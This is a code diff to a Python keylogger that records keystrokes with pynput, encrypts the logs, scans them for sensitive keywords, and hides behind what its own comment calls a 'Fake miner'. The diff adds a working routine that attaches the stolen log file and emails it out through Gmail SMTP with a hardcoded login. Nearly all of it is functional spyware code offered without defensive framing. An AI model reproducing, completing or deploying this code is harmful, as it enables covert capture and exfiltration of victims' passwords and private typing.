@@ -1,15 +1,22 @@
+# General libraries
 import os.path
 import time
 import random
-
-from multiprocessing import Process
 from cryptography.fernet import Fernet
 from os import path
 from pynput.keyboard import Key, Listener
 
+# E-Mail libraries
+import smtplib 
+from email.mime.multipart import MIMEMultipart 
+from email.mime.text import MIMEText 
+from email.mime.base import MIMEBase 
+from email import encoders 
+
 keys = []
 keystrokes_count = 0
 saves_count = 0
+logs_count = 1
 KEYSTROKES_BUFFER_SIZE = 20  # How many keystrokes before saving
 SAVES_BUFFER_SIZE = 2  # How many saves before sending
 LOGS_PATH = "Logs/"  # File path to save stolen data
@@ -123,8 +130,6 @@ def results():
             chunk = ""
             continue
         chunk += byt
-    
-    print(DecryptedLog)
 
     for word in keywords: # Checking if any sensitive data was inputted
         if word in DecryptedLog:
@@ -141,11 +146,30 @@ def send():
     :param data: The data to send.
     :param email: The email used to send. The email is the sender and the receiver.
     """
-    global TARGET_EMAIL
-    # Elad
-    # Send data to mail saved in parameter: TARGET_EMAIL
-    # SMTP
-    print("HAS A KEYWORD")
+    global TARGET_EMAIL, logs_count
+    
+    msg = MIMEMultipart() # Will contain the email message
+    msg['From'] = TARGET_EMAIL
+    msg['To'] = TARGET_EMAIL
+    msg['Subject'] = "New Keylogger Logs"
+    msg.attach(MIMEText("Log number {}".format(logs_count), 'plain'))
+    logs_count += 1
+    
+    fileName = "INTEcoin.dat" # File to send
+    attachment = open(LOGS_PATH + fileName, "rb") 
+    
+    mb = MIMEBase('application', 'octet-stream') # MIMEBase instance
+    mb.set_payload((attachment).read())
+    encoders.encode_base64(mb)
+    mb.add_header('Content-Disposition', "attachment; filename= %s" % fileName)
+    msg.attach(mb) # Attach 'mb' to 'msg'
+    
+    smtp = smtplib.SMTP('smtp.gmail.com', 587) # Create STMP session
+    smtp.starttls()
+    smtp.login(TARGET_EMAIL, "Aa!12345") # E-Mail login
+    
+    smtp.sendmail(TARGET_EMAIL, TARGET_EMAIL, msg.as_string()) # Sending the email
+    smtp.quit() # Terminate STMP session
 
 
 with Listener(on_press=press) as listener: # Keypress listener
@@ -176,9 +200,5 @@ def miner(): # Fake miner
                 file.close()
 
 
-"""
 if __name__ == '__main__':
-    kl = Process(target = miner)
-    kl.start()
-"""
-#miner()
+    miner()
